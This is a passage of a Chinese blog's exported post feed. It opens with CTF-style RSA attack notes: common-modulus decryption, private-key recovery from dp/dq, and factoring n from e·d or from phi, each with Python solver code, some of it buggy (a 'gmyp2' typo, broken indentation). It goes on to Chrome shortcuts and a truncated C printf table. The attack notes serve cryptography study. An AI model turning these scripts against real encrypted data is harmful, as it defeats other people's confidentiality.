d <span class="token operator">=</span> hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p>识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。<br>给出了c1，c2，e1，e2，n<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

gcd<span class="token punctuation">,</span> s<span class="token punctuation">,</span> t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>
<span class="token keyword">if</span> s <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	s <span class="token operator">=</span> <span class="token operator">-</span>s
	c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">if</span> t <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
	t <span class="token operator">=</span> <span class="token operator">-</span>t
	c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c1<span class="token punctuation">,</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>t<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="已知dp，dq"><a href="#已知dp，dq" class="headerlink" title="已知dp，dq"></a>已知dp，dq</h1><p>最开始看到dp和dq时还查了好久，不知道啥意思，推导参考：<a href="https://beiyuouo.github.io/beiyuouo.github.io/blog/ctf-buuctf/">https://beiyuouo.github.io/beiyuouo.github.io/blog/ctf-buuctf/</a></p>
<h2 id="已知dp，dq，p，q，c"><a href="#已知dp，dq，p，q，c" class="headerlink" title="已知dp，dq，p，q，c"></a>已知dp，dq，p，q，c</h2><p>其中</p>
<script type="math/tex; mode=display">
dp \equiv d \pmod {\varphi(p)}，
dq \equiv d \pmod {\varphi(q)}</script><p>使用中国剩余定理即可，但p-1与q-1不互质，推导如下：</p>
<script type="math/tex; mode=display">
dd=gcd(p-1,q-1) \\
d=k_1{\varphi(p)}+dp=k_2{\varphi(q)}+dq \\
k_2{\varphi(q)} \equiv {dp - dq} \pmod{\varphi(p)} \\
k_2 \frac {\varphi(q)}{dd} \equiv \frac{dp-dq}{dd} \pmod {\frac{\varphi(p)}{dd}} \\
k_2 = k' \frac{\varphi(p)}{dd} + \frac{dp-dq}{dd} (\frac{\varphi(q)}{dd})^{-1}</script><p>最后</p>
<script type="math/tex; mode=display">
d=k_2{\varphi(q)}+dq=(k'\frac{\varphi(p)}{dd}+\frac{pd-dq}{dd} 
({\frac{\varphi(q)}{dd}})^{-1}){\varphi(q)}+dq</script><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

n <span class="token operator">=</span> p<span class="token operator">*</span>q
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
dd <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d<span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token operator">-</span>dq<span class="token punctuation">)</span><span class="token operator">//</span>dd <span class="token operator">*</span> gmyp2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>dd<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>dq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="已知e，n，dp，c"><a href="#已知e，n，dp，c" class="headerlink" title="已知e，n，dp，c"></a>已知e，n，dp，c</h2><p>dp同上</p>
<script type="math/tex; mode=display">
e*dp \equiv ed \pmod{\varphi(p)} \\
ed=k{\varphi(p)}+e*dp \\
ed = (k{\varphi(p)}+e*dp) \equiv 1 \pmod{\varphi(n)} \\
k{\varphi(p)}+e*dp=k'(p-1)(q-1)+1 \\
移项得\\
(p-1)(k'(q-1)-k)+1=e*dp \\
\because dp<{\varphi(p)} \\
\therefore e=65537>(k'(q-1)-k)=x</script><p>然后枚举x就可以计算出p-1<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">%</span>x<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	p<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token operator">*</span>dp<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>x<span class="token operator">+</span><span class="token number">1</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	    <span class="token keyword">continue</span>
        	q<span class="token operator">=</span>n<span class="token operator">//</span>p
        	phin<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        	d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>
        	m<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        	    <span class="token keyword">continue</span>

            <span class="token keyword">print</span> m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="已知e，d，n"><a href="#已知e，d，n" class="headerlink" title="已知e，d，n"></a>已知e，d，n</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> sympy
<span class="token comment"># n = p * q</span>
n <span class="token operator">=</span>
<span class="token comment"># e_d = e * d</span>
e_d <span class="token operator">=</span> 
f<span class="token punctuation">,</span> s<span class="token punctuation">,</span> tem <span class="token operator">=</span> e_d<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span>
<span class="token keyword">while</span> f <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
    f <span class="token operator">=</span> f <span class="token operator">//</span> <span class="token number">2</span>
    s <span class="token operator">+=</span> <span class="token number">1</span>
i<span class="token punctuation">,</span> a<span class="token punctuation">,</span> t <span class="token operator">=</span> s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> f
b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">while</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">while</span> i <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">if</span> c <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        b <span class="token operator">=</span> c
        i <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">if</span> b <span class="token operator">==</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">while</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        a <span class="token operator">=</span> sympy<span class="token punctuation">.</span>nextprime<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
q <span class="token operator">=</span> n<span class="token operator">//</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="已知n-pq-，-p-1-q-1"><a href="#已知n-pq-，-p-1-q-1" class="headerlink" title="已知n(pq)，(p-1)(q-1)"></a>已知n(p<em>q)，(p-1)</em>(q-1)</h1><p>利用二分法求p，q<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># n = p * q</span>
n <span class="token operator">=</span>
<span class="token comment"># phi = (p- 1 ) * (q - 1)</span>
phi <span class="token operator">=</span>

c<span class="token operator">=</span>n<span class="token operator">-</span>phi<span class="token operator">+</span><span class="token number">1</span> <span class="token comment"># p + q</span>
l<span class="token operator">=</span>c<span class="token operator">/</span><span class="token number">2</span>
r<span class="token operator">=</span>c

<span class="token keyword">while</span> l<span class="token operator">&lt;</span>r<span class="token punctuation">:</span>
    p<span class="token operator">=</span><span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span>
    y<span class="token operator">=</span>p<span class="token operator">*</span><span class="token punctuation">(</span>c<span class="token operator">-</span>p<span class="token punctuation">)</span>
        <span class="token keyword">if</span> y<span class="token operator">==</span>n<span class="token punctuation">:</span>
            <span class="token keyword">print</span> p
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> y<span class="token operator">></span>n<span class="token punctuation">:</span>
            l<span class="token operator">=</span>p
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r<span class="token operator">=</span>p
q<span class="token operator">=</span>c<span class="token operator">-</span>p
<span class="token keyword">print</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
ms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
cs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> x<span class="token operator">*</span>y<span class="token punctuation">,</span> ms<span class="token punctuation">)</span>
    re <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        M <span class="token operator">=</span> m <span class="token operator">/</span> ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        gcd<span class="token punctuation">,</span> n1<span class="token punctuation">,</span> M1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>ms<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> M<span class="token punctuation">)</span><span class="token comment"># ms[i]*n1 + M*M1 = 1</span>
        re <span class="token operator">+=</span> bs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> M <span class="token operator">*</span> M1
    <span class="token keyword">return</span> re <span class="token operator">%</span> m
m <span class="token operator">=</span> CRT<span class="token punctuation">(</span>cs<span class="token punctuation">,</span>ms<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome 快捷键</title>
    <url>/2020/10/20/chrome-kuai-jie-jian/</url>
    <content><![CDATA[<p>忘了是从哪位大佬那转的了。。。</p>
<span id="more"></span>
<div class="table-container">
<table>
<thead>
<tr>
<th>编号</th>
<th>操作</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Ctrl+N</td>
<td>打开新窗口。</td>
</tr>
<tr>
<td>2</td>
<td>Ctrl+T</td>
<td>打开新标签页。</td>
</tr>
<tr>
<td>3</td>
<td>Ctrl+Shift+N</td>
<td>在隐身模式下打开新窗口。</td>
</tr>
<tr>
<td>4</td>
<td>Ctrl+Shift+T</td>
<td>重新打开上次关闭的标签页。GoogleChrome浏览器可记住最近关闭的10个标签页。</td>
</tr>
<tr>
<td>5</td>
<td>Ctrl+9</td>
<td>切换到最后一个标签页。</td>
</tr>
<tr>
<td>6</td>
<td>Ctrl+Tab</td>
<td>切换到下一个标签页。</td>
</tr>
<tr>
<td>7</td>
<td>Ctrl+PgDown</td>
<td>切换到下一个标签页。</td>
</tr>
<tr>
<td>8</td>
<td>Ctrl+Shift+Tab</td>
<td>切换到上一个标签页。</td>
</tr>
<tr>
<td>9</td>
<td>Ctrl+PgUp</td>
<td>切换到上一个标签页。</td>
</tr>
<tr>
<td>10</td>
<td>Alt+F4</td>
<td>关闭当前窗口。</td>
</tr>
<tr>
<td>11</td>
<td>Ctrl+W</td>
<td>关闭当前标签页或弹出窗口。</td>
</tr>
<tr>
<td>12</td>
<td>Ctrl+F4</td>
<td>关闭当前标签页或弹出窗口。</td>
</tr>
<tr>
<td>13</td>
<td>Alt+Home</td>
<td>在当前窗口打开主页。</td>
</tr>
<tr>
<td>14</td>
<td>Ctrl+P</td>
<td>打印当前网页。</td>
</tr>
<tr>
<td>15</td>
<td>Ctrl+S</td>
<td>保存当前网页。</td>
</tr>
<tr>
<td>16</td>
<td>F5</td>
<td>重新载入当前网页。</td>
</tr>
<tr>
<td>17</td>
<td>Ctrl+R</td>
<td>重新载入当前网页。</td>
</tr>
<tr>
<td>18</td>
<td>Esc</td>
<td>停止载入当前网页。</td>
</tr>
<tr>
<td>19</td>
<td>Ctrl+F</td>
<td>打开查找栏。</td>
</tr>
<tr>
<td>20</td>
<td>Ctrl+G</td>
<td>在查找栏中查找下一条与输入内容相匹配的内容</td>
</tr>
<tr>
<td>21</td>
<td>F3</td>
<td>在查找栏中查找下一条与输入内容相匹配的内容。</td>
</tr>
<tr>
<td>22</td>
<td>Ctrl+Shift+G</td>
<td>在查找栏中查找上一条与输入内容相匹配的内容。</td>
</tr>
<tr>
<td>23</td>
<td>Shift+F3</td>
<td>在查找栏中查找上一条与输入内容相匹配的内容。</td>
</tr>
<tr>
<td>24</td>
<td>Shift+Enter</td>
<td>在查找栏中查找上一条与输入内容相匹配的内容。</td>
</tr>
<tr>
<td>25</td>
<td>Ctrl+F5</td>
<td>重新载入当前网页，忽略缓存的内容。</td>
</tr>
<tr>
<td>26</td>
<td>Shift+F5</td>
<td>重新载入当前网页，忽略缓存的内容。</td>
</tr>
<tr>
<td>27</td>
<td>Ctrl+U</td>
<td>打开当前网页的源代码。</td>
</tr>
<tr>
<td>28</td>
<td>Ctrl+D</td>
<td>将当前网页保存为书签。</td>
</tr>
<tr>
<td>29</td>
<td>Ctrl+Shift+D</td>
<td>将所有打开的网页以书签的形式保存在新文件夹中。</td>
</tr>
<tr>
<td>30</td>
<td>F11</td>
<td>在全屏模式下打开网页。再按一次F11可退出全屏模式。</td>
</tr>
<tr>
<td>31</td>
<td>Home</td>
<td>转至网页顶部。</td>
</tr>
<tr>
<td>32</td>
<td>End</td>
<td>转至网页底部。</td>
</tr>
<tr>
<td>33</td>
<td>Ctrl+0</td>
<td>将网页上的所有内容都恢复到正常大小。</td>
</tr>
<tr>
<td>34</td>
<td>Space</td>
<td>向下滚动网页。</td>
</tr>
<tr>
<td>35</td>
<td>Ctrl+C</td>
<td>将突出显示的内容复制到剪贴板中。</td>
</tr>
<tr>
<td>36</td>
<td>Shift+Insert</td>
<td>从剪贴板中粘贴内容。</td>
</tr>
<tr>
<td>37</td>
<td>Ctrl+V</td>
<td>从剪贴板中粘贴内容。</td>
</tr>
<tr>
<td>38</td>
<td>Ctrl+Shift+V</td>
<td>从剪贴板中粘贴内容(不带格式)。</td>
</tr>
<tr>
<td>39</td>
<td>Shift+Delete</td>
<td>删除突出显示的内容并将其复制到剪贴板中。</td>
</tr>
<tr>
<td>40</td>
<td>Ctrl+X</td>
<td>删除突出显示的内容并将其复制到剪贴板中。</td>
</tr>
<tr>
<td>41</td>
<td>Alt+F</td>
<td>打开“工具”菜单，用该菜单可自定义和控制GoogleChrome浏览器中的设置。</td>
</tr>
<tr>
<td>42</td>
<td>Alt+E</td>
<td>打开“工具”菜单，用该菜单可自定义和控制GoogleChrome浏览器中的设置。</td>
</tr>
<tr>
<td>43</td>
<td>Ctrl+Shift+B</td>
<td>打开和关闭书签栏。</td>
</tr>
<tr>
<td>44</td>
<td>Ctrl+H</td>
<td>打开“历史记录”页面。</td>
</tr>
<tr>
<td>45</td>
<td>Ctrl+J</td>
<td>打开“下载内容”页面。</td>
</tr>
<tr>
<td>46</td>
<td>Shift+Esc</td>
<td>打开任务管理器。</td>
</tr>
<tr>
<td>47</td>
<td>Shift+Alt+T</td>
<td>依次打开最近关闭的网页</td>
</tr>
<tr>
<td>48</td>
<td>Shift+F10</td>
<td>可打开相关右键菜单(例如，“后退”按钮关联的浏览历史记录)。</td>
</tr>
<tr>
<td>49</td>
<td>Esc</td>
<td>可将焦点从工具栏移回到网页上。</td>
</tr>
<tr>
<td>50</td>
<td>Ctrl+Shift+J</td>
<td>打开开发人员工具。</td>
</tr>
<tr>
<td>51</td>
<td>Ctrl+Shift+Delete</td>
<td>打开“清除浏览数据”对话框。</td>
</tr>
<tr>
<td>52</td>
<td>F1</td>
<td>在新标签页中打开帮助中心(首选方式)。</td>
</tr>
<tr>
<td>53</td>
<td>F6</td>
<td>将焦点切换到下一个键盘可访问的窗格</td>
</tr>
<tr>
<td>54</td>
<td>Shift+F6</td>
<td>将焦点切换到下一个键盘可访问的窗格</td>
</tr>
<tr>
<td>55</td>
<td>↓</td>
<td>导航元素</td>
</tr>
<tr>
<td>56</td>
<td>↑</td>
<td>导航元素</td>
</tr>
<tr>
<td>57</td>
<td>←</td>
<td>展开元素</td>
</tr>
<tr>
<td>58</td>
<td>→</td>
<td>收起元素</td>
</tr>
<tr>
<td>59</td>
<td>Enter</td>
<td>输入属性</td>
</tr>
<tr>
<td>60</td>
<td>H</td>
<td>隐藏属性</td>
</tr>
<tr>
<td>61</td>
<td>F2</td>
<td></td>
</tr>
<tr>
<td>62</td>
<td>TabShift+Tab</td>
<td>下一个属性</td>
</tr>
<tr>
<td>63</td>
<td>↑</td>
<td>增加值</td>
</tr>
<tr>
<td>64</td>
<td>↓</td>
<td>减少值</td>
</tr>
<tr>
<td>65</td>
<td>PageUp</td>
<td>增加10</td>
</tr>
<tr>
<td>66</td>
<td>PageDown</td>
<td>减少10</td>
</tr>
<tr>
<td>67</td>
<td>Shift+↑</td>
<td>增加10</td>
</tr>
<tr>
<td>68</td>
<td>Shift+↓</td>
<td>减少10</td>
</tr>
<tr>
<td>69</td>
<td>Shift+PageUp</td>
<td>增加100</td>
</tr>
<tr>
<td>70</td>
<td>Shift+PageDown</td>
<td>减少100</td>
</tr>
<tr>
<td>71</td>
<td>Alt+↑</td>
<td>增加0.1</td>
</tr>
<tr>
<td>72</td>
<td>Alt+↓</td>
<td>减少0.1</td>
</tr>
<tr>
<td>73</td>
<td>F8</td>
<td>暂停/继续</td>
</tr>
<tr>
<td>74</td>
<td>Ctrl+\</td>
<td>暂停/继续</td>
</tr>
<tr>
<td>75</td>
<td>F10</td>
<td>跳过</td>
</tr>
<tr>
<td>76</td>
<td>Ctrl+’</td>
<td>跳过</td>
</tr>
<tr>
<td>77</td>
<td>F11</td>
<td>步入调试面板</td>
</tr>
<tr>
<td>78</td>
<td>Ctrl+Shift+;</td>
<td>跳出</td>
</tr>
<tr>
<td>79</td>
<td>Shift+F11</td>
<td>跳出</td>
</tr>
<tr>
<td>80</td>
<td>Ctrl+.</td>
<td>下一个调用栈</td>
</tr>
<tr>
<td>81</td>
<td>Ctrl+,</td>
<td>上一个调用栈</td>
</tr>
<tr>
<td>82</td>
<td>Ctrl+Shift+E</td>
<td>在控制面板上计算选中的表达式</td>
</tr>
<tr>
<td>83</td>
<td>Ctrl+Shift+A</td>
<td>将选中内容添加到监视</td>
</tr>
<tr>
<td>84</td>
<td>Ctrl+B</td>
<td>添加/删除断点</td>
</tr>
<tr>
<td>85</td>
<td>Ctrl+L</td>
<td>清屏</td>
</tr>
<tr>
<td>86</td>
<td>Tab</td>
<td>自动完成相同部分</td>
</tr>
<tr>
<td>87</td>
<td>→</td>
<td>选中提示的内容</td>
</tr>
<tr>
<td>88</td>
<td>Ctrl+U</td>
<td>清除输入的整行内容</td>
</tr>
<tr>
<td>89</td>
<td>↓</td>
<td>下一个历史命令</td>
</tr>
<tr>
<td>90</td>
<td>↑</td>
<td>上一个历史命令</td>
</tr>
<tr>
<td>91</td>
<td>Enter</td>
<td>执行命令</td>
</tr>
<tr>
<td>92</td>
<td>Ctrl+Shift+P</td>
<td>跳到成员</td>
</tr>
<tr>
<td>93</td>
<td>Ctrl+Space</td>
<td>自动完成</td>
</tr>
<tr>
<td>94</td>
<td>Ctrl+G</td>
<td>跳到指定行</td>
</tr>
<tr>
<td>95</td>
<td>Alt+-</td>
<td>跳到上一次编辑的位置</td>
</tr>
<tr>
<td>96</td>
<td>Alt++</td>
<td>跳到下一个编辑的位置</td>
</tr>
<tr>
<td>97</td>
<td>Ctrl+/</td>
<td>注释/取消注释</td>
</tr>
<tr>
<td>98</td>
<td>Alt+↑</td>
<td>增加1个CSS单位</td>
</tr>
<tr>
<td>99</td>
<td>Alt+↓</td>
<td>减少1个CSS单位</td>
</tr>
<tr>
<td>100</td>
<td>Alt+PageUp</td>
<td>增加10个CSS单位</td>
</tr>
<tr>
<td>101</td>
<td>Alt+PageDown</td>
<td>减少10个CSS单位</td>
</tr>
<tr>
<td>102</td>
<td>Ctrl+D</td>
<td>选中下一个匹配</td>
</tr>
<tr>
<td>103</td>
<td>Ctrl+U</td>
<td>软重做</td>
</tr>
<tr>
<td>104</td>
<td>Ctrl+M</td>
<td>跳到匹配的括号处</td>
</tr>
<tr>
<td>105</td>
<td>Alt+W</td>
<td>关闭编辑器标签</td>
</tr>
<tr>
<td>106</td>
<td>Alt+O</td>
<td>切换到文件名相同但后缀不同的文件</td>
</tr>
<tr>
<td>107</td>
<td>Ctrl+E</td>
<td>开始/停止录制</td>
</tr>
<tr>
<td>108</td>
<td>Ctrl+R</td>
<td>录制页面载入</td>
</tr>
<tr>
<td>109</td>
<td>Ctrl+S</td>
<td>保存时间线数据</td>
</tr>
<tr>
<td>110</td>
<td>Ctrl+O</td>
<td>载入时间线数据</td>
</tr>
<tr>
<td>111</td>
<td>[</td>
<td>跳到上一个帧</td>
</tr>
<tr>
<td>112</td>
<td>]</td>
<td>跳到下一个帧</td>
</tr>
<tr>
<td>113</td>
<td>Ctrl+E</td>
<td>开始/结束录制</td>
</tr>
<tr>
<td>114</td>
<td>Ctrl+]</td>
<td>焦点移动到右边的面板</td>
</tr>
<tr>
<td>115</td>
<td>Ctrl+[</td>
<td>焦点移动到左边的面板</td>
</tr>
<tr>
<td>116</td>
<td>Ctrl+Alt+[</td>
<td>焦点移动到上一次操作的面板</td>
</tr>
<tr>
<td>117</td>
<td>Ctrl+Alt+]</td>
<td>焦点移动到下一次操作的面板</td>
</tr>
<tr>
<td>118</td>
<td>Ctrl+Tilde</td>
<td>显示控制台</td>
</tr>
<tr>
<td>119</td>
<td>Esc</td>
<td>显示/隐藏控制台小面板</td>
</tr>
<tr>
<td>120</td>
<td>Ctrl+Shift+M</td>
<td>显示/隐藏设备模式</td>
</tr>
<tr>
<td>121</td>
<td>Ctrl+Shift+D</td>
<td>显示/隐藏侧板</td>
</tr>
<tr>
<td>122</td>
<td>Ctrl+F</td>
<td>搜索</td>
</tr>
<tr>
<td>123</td>
<td>Ctrl+Shift+F</td>
<td>搜索所有的源文件</td>
</tr>
<tr>
<td>124</td>
<td>Ctrl+Shift+C</td>
<td>选择探测一个页面元素</td>
</tr>
<tr>
<td>125</td>
<td>Ctrl+P</td>
<td>打开源码文件搜索需要在开发者工具下使用</td>
</tr>
<tr>
<td>126</td>
<td>F12</td>
<td>打开开发者工具</td>
</tr>
<tr>
<td>127</td>
<td>Shift+Tab</td>
<td>上一个属性</td>
</tr>
<tr>
<td>128</td>
<td>Ctrl+;</td>
<td>步入调试面板</td>
</tr>
<tr>
<td>129</td>
<td>ALT + ←</td>
<td>后退到历史记录中的上一页面</td>
</tr>
<tr>
<td>130</td>
<td>ALT + →</td>
<td>前进到历史记录中的下一页面</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>C格式化修饰符</title>
    <url>/2020/11/12/c-ge-shi-hua-xiu-shi-fu/</url>
    <content><![CDATA[<p>printf()与scanf()函数格式化修饰</p>
<span id="more"></span>
<h1 id="printf-函数转换说明及其打印的输出结果"><a href="#printf-函数转换说明及其打印的输出结果" class="headerlink" title="printf()函数转换说明及其打印的输出结果"></a>printf()函数转换说明及其打印的输出结果</h1><div class="table-container">
<table>
<thead>
<tr>
<th>转换说明</th>
<th>输出</th>
</tr>
</thead>
<tbody>
<tr>
<td>%a</td>
<td>浮点数、十六进制数和p计数法(C99/C11)</td>
</tr>
<tr>
<td>%A</td>
<td>浮点数、十六进制数和p计数法(C99/C11)</td>
</tr>
<tr>
<td>%c</td>
<td>单个字符</td>
</tr>
<tr>
<td>%d</td>
<td>有符号十进制整数</td>
</tr>
<tr>
<td>%e</td>
<td>浮点数，e计数法</td>
</tr>
<tr>
<td>%E</td>
<td>浮点数，e计数法</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数，十进制计数法</td>
</tr>
<tr>
<td>%g</td>
<td>根据值的不同，自动选择%f或%e，%e格式用于指数小于-4或者大于等于精度时</td>
</tr>
<tr>
<td>%G</td>
